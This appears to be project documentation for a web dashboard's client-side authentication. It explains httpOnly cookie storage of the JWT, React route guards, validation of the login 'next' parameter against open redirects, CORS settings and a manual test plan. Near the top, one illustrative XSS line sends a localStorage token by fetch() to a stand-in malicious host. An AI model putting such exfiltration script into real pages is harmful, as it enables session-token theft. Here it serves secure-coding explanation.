# Client-Side Session and Route Protection

Documentation for **Phase 1 card 1.9**. This document explains where the token
is stored, how private pages are protected, and why each choice was made.

Validation criterion: **a protected page redirects to the login page when the
user is not authenticated.**

---

## 1. Where the Token Is Stored

**Nowhere in the frontend code, intentionally.**

The server sets the JWT in an `httpOnly` cookie at login. The browser sends it
automatically with every request, and **the page's JavaScript cannot read it**.

This protects against theft through XSS: a vulnerability that allows a script
to run on the page still would not provide access to the token.

### Why Not `localStorage`

This is the most common mistake. `localStorage` can be read by **any script**
on the page:

```js
// a script injected through an XSS vulnerability
fetch("https://malicious-site.com/collect?token=" + localStorage.getItem("token"));
```

With an `httpOnly` cookie, this line returns nothing.

### What About the Token Returned at Login?

`POST /auth/login` also returns the token in the response body:

```json
{ "token": "eyJhbGciOiJIUzI1NiIs...", "user": { ... } }
```

It exists for clients that do not handle cookies: curl, Postman, or a future
mobile client. **The frontend deliberately ignores it.**

### What the Frontend Keeps in Memory

Only the **current user**: ID, email, and role. This is not a secret; it is
used only to decide what the interface displays. This data lives in React
state and disappears on reload, when it is requested from the server again.

---

## 2. Overview

```
   layout.tsx
       │
       └── <AuthProvider>            on mount: GET /auth/me
              │                         200 -> authenticated
              │                         401 -> anonymous
              │
              ├── <RequireAuth>      anonymous -> /login?next=<page>
              │      └── dashboard
              │
              ├── <RequireAdmin>     user role -> home
              │      └── admin
              │
              └── <GuestOnly>        authenticated -> "next" page
                     └── /login
```

Because the cookie is invisible to JavaScript, **the only way to know whether a
session exists is to ask the server**. This is the role of `GET /auth/me` on
page load.

---

## 3. Created and Modified Files

| File | Action | Purpose |
|---|---|---|
| `client_web/src/lib/auth/AuthProvider.tsx` | Created | Session state shared by the entire application |
| `client_web/src/lib/auth/guards.tsx` | Created | `RequireAuth`, `RequireAdmin`, `GuestOnly` |
| `client_web/src/lib/auth/redirect.ts` | Created | Validation of the `next` parameter |
| `client_web/src/lib/api.ts` | Modified | Detects expired sessions |
| `client_web/src/app/layout.tsx` | Modified | Wraps the application in `AuthProvider` |
| `client_web/src/app/page.tsx` | Modified | Protected dashboard and logout button |
| `client_web/src/app/login/page.tsx` | Created | Minimal login page |
| `server/src/index.ts` | Modified | CORS |
| `server/package.json` | Modified | `cors` dependency |
| `.env.example` | Modified | Corrected `CLIENT_URL` |

### `AuthProvider.tsx`

Exposes `useAuth()` to the entire application:

| Field | Contents |
|---|---|
| `user` | The current user, or `null` |
| `status` | `loading`, `authenticated`, or `anonymous` |
| `login()` | Logs in and updates the state |
| `logout()` | Logs out, even if the request fails |
| `refreshUser()` | Requests the user from the server again |

The `loading` state prevents a visual glitch: without it, the protected page
would appear briefly before being replaced by the redirect.

`login()` **does not catch errors**: the login page needs them to display
"incorrect password" or "confirm your account".

### `guards.tsx`

Three components that wrap page content:

```tsx
export default function DashboardPage() {
  return (
    <RequireAuth>
      <DashboardContent />
    </RequireAuth>
  );
}
```

**These guards are not a security feature.** Anyone can bypass frontend code
with the browser's development tools. The actual protection is the server's
`requireAuth` middleware, which returns `401` for every request without a valid
token.

The guards serve the user experience: never display an empty page, and send
the user where they need to go.

`router.replace` is used instead of `router.push`: the protected page should
not remain in browser history. Otherwise, the Back button would return to a
page that immediately redirects to `/login`, creating a loop.

### `redirect.ts`

When a guard sends an anonymous visitor to the login page, it remembers the
intended destination: `/login?next=/services`. After login, the user returns
to `/services` instead of the home page.

This parameter comes from the URL, so **anyone can forge it**. Without
validation, this link would be dangerous:

```
http://localhost:8081/login?next=https://malicious-site.com/fake-dashboard
```

The victim would see our real login page, enter their credentials, and then be
sent to a fake site. This is an **open redirect**.

`safeRedirectPath()` accepts only an internal path and also blocks less obvious
traps:

| Input | Result | Reason |
|---|---|---|
| `/services` | `/services` | Internal path, accepted |
| `https://malicious-site.com` | `/` | Absolute URL |
| `//malicious-site.com` | `/` | Protocol-relative URL, read as absolute by the browser |
| `/\\malicious-site.com` | `/` | Some browsers convert `\\` to `/` |
| `/login?next=/x` | `/` | Would create a loop |

### The `api.ts` Modification

A session can expire **while the user is working**: the token expires, the
account is deleted, or the user logs out in another tab. The symptom is a `401`
on a protected route.

`api.ts` notifies the application, which switches back to anonymous state and
redirects. Otherwise, every page would have to handle this case separately.

**Not every `401` means the session has ended.** A wrong password also returns
`401` on `/auth/login`; redirecting at that point would interrupt the user
while they are typing. This is why the routes where `401` is a normal response
are listed:

```ts
const ROUTES_WHERE_401_IS_EXPECTED = [
  "/auth/login", "/auth/register", "/auth/verify", "/auth/logout", "/auth/me",
];
```

### `login/page.tsx`

A deliberately **minimal** page, written because the guards need a
 destination.

- The **logic is final**: login through `useAuth()`, error messages selected by
  HTTP status, and return to `next`.
- The **interface** belongs to card 1.8, which will restyle it without changing
  its behavior.

Messages are selected by **status code**, never by reading the text returned by
the server, which could change:

| Code | Displayed message |
|---|---|
| `401` | Incorrect credentials |
| `403` | Confirm your account using the link received by email |
| `400` | Missing fields |
| Other | Server unreachable |

---

## 4. Server-Side Fixes

Two problems prevented the cookie from working in real-server mode. They would
not have been discovered until the synchronization point.

### CORS

The frontend runs on `localhost:8081`, while the API runs on `localhost:8080`:
these are two different **origins**. Without CORS headers, the browser blocks
API responses **and ignores its `Set-Cookie` header**. The session would never
persist.

```ts
const allowedOrigin = process.env.CLIENT_URL ?? "http://localhost:8081";
app.use(cors({ origin: allowedOrigin, credentials: true }));
```

`credentials: true` allows the cookie to be sent and received. It **requires
an explicit origin**: browsers reject the `*` wildcard when a cookie is
involved. This is protection, not an arbitrary restriction; otherwise any site
could read authenticated responses from our API.

### `CLIENT_URL`

It was set to `http://localhost:3000` even though the frontend is published on
port 8081. It is used in two places: the origin allowed by CORS and the
redirect after an OAuth callback (Phase 2).

---

## 5. Tests

### Prerequisite

`server/package.json` changed, so `.env` must be corrected manually:

```bash
sed -i 's|^CLIENT_URL=.*|CLIENT_URL=http://localhost:8081|' .env
grep CLIENT_URL .env

docker-compose up -d --build server
docker-compose up -d --force-recreate client_web
```

### Card Criterion

| # | Action | Expected |
|---|---|---|
| 1 | Open `http://localhost:8081/` | Redirected to `/login?next=%2F` |
| 2 | Log in (`demo@dashboard.dev` / `password123`) | Returned to dashboard, email displayed |
| 3 | Reload the page | Still logged in |
| 4 | Open `/login` while logged in | Redirected to the dashboard |
| 5 | Click "Log out" | Returned to `/login` |
| 6 | Reopen `/` | Redirected to `/login` |

### Login Errors

| Account | Expected |
|---|---|
| `demo@dashboard.dev` + wrong password | "Incorrect email or password.", **no redirect** |
| `pending@dashboard.dev` | "Please confirm your account..." (C3) |

### Open Redirect

Open the following URL and log in:

```
http://localhost:8081/login?next=https://evil.example
```

Expected: the user remains on the dashboard and is never redirected to the
external site.

Compare it with a legitimate `next` value:

```
http://localhost:8081/login?next=%2Fdev
```

Expected: after login, the user lands on `/dev`.

### Token Storage

Development tools -> **Application** tab -> **Local Storage**.

Expected: one key, `dashboard-mock-state-v1` (the mock state).
**No token** should appear there.

### Summary

| # | Test | Expected |
|---|---|---|
| 1 | Protected page, anonymous user | Redirect to `/login?next=...` |
| 2 | Login | Return to the requested page |
| 3 | Reload | Session preserved |
| 4 | `/login` while logged in | Redirected to the dashboard |
| 5 | Logout | Return to `/login` |
| 6 | Wrong password | Error message, no redirect |
| 7 | Unconfirmed account | Confirmation message (C3) |
| 8 | Malicious `next` value | Sent to the home page |
| 9 | Local Storage | No token |

---

## 6. Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| `Can't resolve '../../lib/api'` in `app/page.tsx` | Contents of `page.tsx` and `login/page.tsx` were swapped | Put each file back in its place: from `app/page.tsx` the path is `../lib/...`; from `app/login/page.tsx` it is `../../lib/...` |
| `useAuth must be used inside <AuthProvider>` | `layout.tsx` does not wrap the application | Add `<AuthProvider>` around `{children}` |
| `has no exported member 'setUnauthorizedListener'` | `api.ts` was not updated | Apply the `api.ts` modification |
| `Cannot find module 'cors'` at server startup | Dependency not declared | Add `cors` to `server/package.json`, then run `up -d --build server` |
| Login does not persist in real mode | Missing CORS or incorrect `CLIENT_URL` | Check both, then recreate the server container |
| `npx next build` downloads Next.js 16 and fails with `Could not find the Next.js package` | `node_modules` does not exist on the host; dependencies live in the container | Run the command in the container: `docker-compose exec client_web npx tsc --noEmit -p tsconfig.json` |

The number of nested directories determines the number of `../` segments. It
is the most common cause of errors when moving a page file.

### Where to Run Commands

| Command | Where |
|---|---|
| `npx tsc`, `npm install`, `next build` | **Inside the container**: `docker-compose exec client_web ...` |
| `git`, file editing | On the host machine |

The source files are shared with the container through the
`./client_web/src:/app/src` volume, but `node_modules` remains inside the image.
Any command that needs dependencies must therefore run inside the container;
otherwise `npx` downloads an arbitrary version from the registry.

---

## 7. Rejected Choice: Next.js Middleware

Next.js provides a `middleware.ts` that runs before every request and could
redirect without ever loading the page.

It was rejected for three reasons:

1. **It does not work in mock mode.** The mock does not issue a cookie, so the
   middleware would consider everyone logged out. The frontend would become
   untestable without the server, cancelling the benefit of card 1.6.
2. **It cannot verify the token signature** without sharing `JWT_SECRET` with
   the frontend. It could only observe that a cookie exists, which a user can
   forge.
3. **It does not replace server protection.** The actual barrier remains the
   API's `requireAuth` middleware, so Next.js middleware would add only a
   display convenience already provided by the guards.

It could become relevant in production to avoid sending private-page code to an
anonymous visitor.

---

## 8. Remaining Work

| Item | Card |
|---|---|
| General layout and Tailwind theme | 1.7 |
| Registration, confirmation, and login page interface | 1.8 |
| Dashboard grid | 1.10 |
| Switch to the real server | 1.11 - synchronization point |
| `RequireAdmin` used by the administration section | Phase 3 |

`RequireAdmin` is written and tested but is not yet used by any page; it is
waiting for the administration section.
